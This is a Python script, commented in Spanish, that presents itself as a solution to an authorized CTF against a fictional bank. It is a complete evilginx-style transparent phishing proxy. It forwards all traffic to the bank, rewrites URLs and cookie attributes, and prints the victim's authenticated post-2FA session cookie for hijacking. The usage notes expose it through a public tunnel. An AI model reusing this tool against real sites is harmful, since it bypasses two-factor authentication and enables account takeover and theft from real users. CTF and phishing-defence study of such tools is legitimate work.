#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Veltra Bank — reverse proxy TRANSPARENTE (estilo evilginx) para CTF.

Laboratorio CTF autorizado; Veltra Bank es ficticio. Objetivo: iniciar sesion
como Gaston Diaz.

POR QUE TRANSPARENTE Y NO UN CLON POR RUTAS
-------------------------------------------
El enunciado dice: "El cliente de Veltra Bank esta por iniciar sesion". El bot
(Gaston) llega SIN sesion y SE LOGUEA SOLO: tiene su usuario, su clave Y su OTP,
pero su OTP solo vale contra una sesion real del banco. Un clon selectivo (que
reimplementa solo /login, /verificar y los /api/*) no alcanza: cualquier ruta o
estatico que falte rompe la ilusion y el bot nunca completa el 2FA.

Este proxy es TRANSPARENTE: reenvia CUALQUIER path/metodo al banco y propaga
las cookies en ambos sentidos. El bot "ve" el banco entero servido desde tu
dominio. Cuando el bot completa SU login (user+pass+OTP) a traves nuestro, la
cookie de sesion AUTENTICADA de Gaston queda asociada a NUESTRO dominio y la
vemos pasar en cada request. Esa cookie = la sesion de Gaston. La pegas en tu
navegador y entras. Flag.

La cookie del banco no trae SameSite ni Secure, y no hay CSP ni X-Frame-Options:
nada impide servirlo reescrito desde otro origen.

USO
---
  pip install flask requests
  python proxy.py            # escucha en :8000
  cloudflared tunnel --url http://localhost:8000
  # poner la URL del tunel en "la URL que queres que visite" el bot
  # mirar la consola: imprime la cookie cuando pasa a autenticada
"""
import os
import re
import sys

try:
    import requests
    from flask import Flask, request, Response
except ImportError:
    sys.exit("Faltan dependencias: pip install flask requests")

TARGET = "https://chl-fa7967e4-7c30-423b-a5c9-7284b46bf760-veltra-bank.softwareseguro.com.ar"
TARGET_HOST = TARGET.split("://", 1)[1]

UA_FALLBACK = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36")

# TLS: ca_bundle.pem = certifi + la CA raiz de Avast (ese antivirus intercepta
# TLS y re-firma los certificados con una CA local que certifi no conoce, por
# eso requests falla con CERTIFICATE_VERIFY_FAILED y curl no). Si no esta el
# bundle, se usa la verificacion normal de certifi.
_DIR = os.path.dirname(os.path.abspath(__file__))
_BUNDLE = os.path.join(_DIR, "ca_bundle.pem")
try:
    import certifi
    VERIFY = _BUNDLE if os.path.exists(_BUNDLE) else certifi.where()
except Exception:
    VERIFY = _BUNDLE if os.path.exists(_BUNDLE) else True

# static_folder=None: sin esto, Flask registra su propia ruta /static/<file>
# que intercepta /static/... antes que nuestro catch-all y devuelve 404 (no
# existe el archivo local). Al desactivarla, /static/... tambien se proxea.
app = Flask(__name__, static_folder=None)

# headers hop-by-hop que no se reenvian
_HOP = {"connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
        "te", "trailers", "transfer-encoding", "upgrade", "content-encoding",
        "content-length", "host"}

_seen_cookie = {"last": None}


def _rewrite(text):
    # Reescribe URLs absolutas del banco -> nuestro host, para que el bot no
    # salte al dominio real a mitad de flujo.
    if not text:
        return text
    return text.replace("https://" + TARGET_HOST, "").replace(TARGET, "")


@app.route("/", defaults={"path": ""},
           methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
@app.route("/<path:path>",
           methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
def proxy(path):
    url = TARGET + "/" + path
    if request.query_string:
        url += "?" + request.query_string.decode("latin-1")

    # Reenviar headers del bot, cambiando Host al del banco.
    fwd = {}
    for k, v in request.headers:
        if k.lower() in _HOP:
            continue
        fwd[k] = v
    fwd["Host"] = TARGET_HOST
    fwd.setdefault("User-Agent", UA_FALLBACK)
    # Origin/Referer apuntando al banco (por si valida)
    if "Origin" in fwd:
        fwd["Origin"] = TARGET
    if "Referer" in fwd:
        fwd["Referer"] = fwd["Referer"].replace(request.host_url.rstrip("/"), TARGET)
    fwd["Accept-Encoding"] = "identity"  # sin gzip, para poder reescribir

    # Cookies que el bot manda (para NUESTRO dominio) -> se las pasamos al banco.
    cookies = request.cookies.to_dict()

    try:
        resp = requests.request(
            method=request.method, url=url, headers=fwd,
            data=request.get_data(), cookies=cookies,
            allow_redirects=False, verify=VERIFY, timeout=30)
    except Exception as e:
        print("[!] upstream error:", e, flush=True)
        return Response("proxy error", status=502)

    # LOG + captura de la cookie de sesion que el banco setea.
    for sc in resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []:
        m = re.search(r'session=([^;]+)', sc)
        if m:
            tok = m.group(1)
            if tok != _seen_cookie["last"]:
                _seen_cookie["last"] = tok
                _report_cookie(tok, path)

    # Construir la respuesta para el bot, reescribiendo cuerpo y cabeceras.
    ctype = resp.headers.get("Content-Type", "")
    body = resp.content
    if any(t in ctype for t in ("text/html", "javascript", "json", "text/css")):
        try:
            body = _rewrite(resp.content.decode("utf-8", "replace")).encode("utf-8")
        except Exception:
            body = resp.content

    out_headers = []
    for k, v in resp.headers.items():
        lk = k.lower()
        if lk in _HOP:
            continue
        if lk == "set-cookie":
            continue  # las manejamos aparte abajo
        if lk == "location":
            v = _rewrite(v)  # redirects relativos a nuestro dominio
        out_headers.append((k, v))

    out = Response(body, status=resp.status_code, headers=out_headers)
    # Reenviar las cookies del banco al bot, pero para NUESTRO dominio
    # (sin Domain, sin Secure, para que el bot las guarde en trycloudflare).
    for sc in (resp.raw.headers.getlist("Set-Cookie")
               if hasattr(resp.raw.headers, "getlist") else []):
        # quitar atributos Domain y Secure
        clean = re.sub(r';\s*Domain=[^;]+', '', sc, flags=re.I)
        clean = re.sub(r';\s*Secure', '', clean, flags=re.I)
        out.headers.add("Set-Cookie", clean)
    return out


def _report_cookie(tok, path):
    import base64
    payload = tok.split('.')[0]
    payload += '=' * ((4 - len(payload) % 4) % 4)
    try:
        decoded = base64.urlsafe_b64decode(payload).decode('utf-8', 'replace')
    except Exception:
        decoded = '<?>'
    print("\n" + "-" * 70, flush=True)
    print("  [cookie] en %s  ->  %s" % ("/" + path, decoded), flush=True)
    print("      session=%s" % tok, flush=True)
    # Heuristica: si ya NO dice pre_2fa, es sesion autenticada post-2FA.
    if "pre_2fa" not in decoded:
        print("\n" + "=" * 70, flush=True)
        print("  [***] COOKIE AUTENTICADA (post-2FA) DE GASTON:", flush=True)
        print("\n      session=%s\n" % tok, flush=True)
        print("  Pegar en el navegador (cookie 'session') en:", flush=True)
        print("  %s   y abrir /dashboard" % TARGET, flush=True)
        print("=" * 70 + "\n", flush=True)
    print("-" * 70, flush=True)


if __name__ == "__main__":
    print("Veltra REVERSE PROXY transparente en http://127.0.0.1:8000", flush=True)
    print("Target: %s" % TARGET, flush=True)
    print("Tunel:  cloudflared tunnel --url http://localhost:8000\n", flush=True)
    app.run(host="0.0.0.0", port=8000, threaded=True)
